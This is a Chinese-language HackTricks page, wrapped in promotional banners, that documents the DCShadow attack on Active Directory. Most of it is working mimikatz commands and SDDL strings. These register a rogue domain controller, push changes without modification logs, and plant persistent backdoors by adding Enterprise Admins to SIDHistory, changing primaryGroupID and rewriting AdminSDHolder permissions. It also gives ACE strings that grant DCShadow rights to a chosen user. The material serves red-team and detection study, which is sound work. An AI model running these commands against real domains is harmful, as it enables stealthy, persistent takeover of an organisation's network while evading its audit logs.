<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# DCShadow

它在AD中注册一个**新的域控制器**，并使用它来在指定对象上**推送属性**（SIDHistory、SPNs等），而不会留下任何关于**修改**的**日志**。您需要DA权限并且必须在**根域**内。\
请注意，如果使用错误的数据，将会出现相当丑陋的日志。

要执行攻击，您需要2个mimikatz实例。其中一个将以SYSTEM权限启动RPC服务器（您必须在此指定要执行的更改），另一个实例将用于推送值：

{% code title="mimikatz1（RPC服务器）" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - 需要DA或类似权限" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

请注意，**`elevate::token`** 在 `mimikatz1` 会话中不起作用，因为它提升了线程的特权，但我们需要提升**进程的特权**。\
您还可以选择和“LDAP”对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

您可以从具有以下最低权限的 DA 或用户推送更改：

* 在**域对象**中：
* _DS-Install-Replica_（在域中添加/删除副本）
* _DS-Replication-Manage-Topology_（管理复制拓扑）
* _DS-Replication-Synchronize_（复制同步）
* **配置容器**中的**站点对象**（及其子对象）：
* _CreateChild 和 DeleteChild_
* **注册为 DC 的计算机对象**：
* _WriteProperty_（不是 Write）
* **目标对象**：
* _WriteProperty_（不是 Write）

您可以使用[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 将这些权限授予无特权用户（请注意，这将留下一些日志）。这比拥有 DA 权限要严格得多。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着用户名 _**student1**_ 在 _**mcorp-student1**_ 计算机上登录时具有对对象 _**root1user**_ 的 DCShadow 权限。

## 使用 DCShadow 创建后门

{% code title="将 SIDHistory 中的企业管理员设置为用户" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="更改PrimaryGroupID（将用户设置为域管理员组的成员）" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="修改 AdminSDHolder 的 ntSecurityDescriptor（为用户授予完全控制权限）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - 使用DCShadow授予DCShadow权限（无修改权限日志）

我们需要在以下ACE后附加我们用户的SID：

* 在域对象上：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
* 在目标用户对象上：`(A;;WP;;;UserSID)`
* 在配置容器中的站点对象上：`(A;CI;CCDC;;;UserSID)`

要获取对象的当前ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

请注意，在这种情况下，您需要进行**多个更改**，而不仅仅是一个。因此，在**mimikatz1会话**（RPC服务器）中，使用参数**`/stack`与您想要进行的每个更改**。这样，您只需要**`/push`**一次即可执行在恶意服务器中所有堆积的更改。



[**有关ired.team中DCShadow的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
